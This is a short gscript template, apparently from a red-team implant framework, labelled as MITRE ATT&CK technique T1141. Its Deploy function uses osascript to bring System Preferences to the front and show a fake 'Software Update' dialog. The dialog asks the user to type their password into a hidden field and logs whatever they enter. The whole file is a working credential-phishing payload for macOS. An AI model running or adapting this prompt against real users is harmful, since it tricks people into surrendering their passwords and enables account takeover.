// Example gscript template
// Title: Osascript Prompt
// Author: ahhh
// Purpose: Prompts the user for their password with the builtin Osascript
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1141

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Starting Osascript Prompt");
  return true; 
}

function Deploy() {  
  var first = 'tell app "System Preferences" to activate';
  var second = 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"';
  var response = ExecuteCommand("osascript", ["-e", first, "-e", first, "-e", second]);
  LogInfo(response.retObject.Stdout);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Osascript Prompt");
  return true;
}